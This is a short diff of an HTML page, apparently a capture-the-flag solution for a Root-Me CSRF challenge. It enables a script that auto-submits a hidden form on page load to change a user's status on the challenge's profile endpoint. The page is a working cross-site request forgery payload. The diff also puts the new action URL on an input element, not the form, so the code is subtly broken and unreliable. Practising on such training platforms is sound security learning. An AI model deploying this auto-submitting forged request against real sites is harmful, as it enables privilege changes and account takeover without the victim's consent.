@@ -6,11 +6,11 @@
 <body>
 
 <form id="csrf" method="POST">
-    <input type="text" name="username" value="admin2">
+    <input type="text" name="username" value="admin2" action="http://challenge01.root-me.org/web-client/ch22/?action=profile">
 <input type="checkbox" name="status" value ="on" checked enabled="">
 </form>
 <script>
-    //document.getElementById('csrf').submit();
+    document.getElementById('csrf').submit();
 </script>
 
 </body>
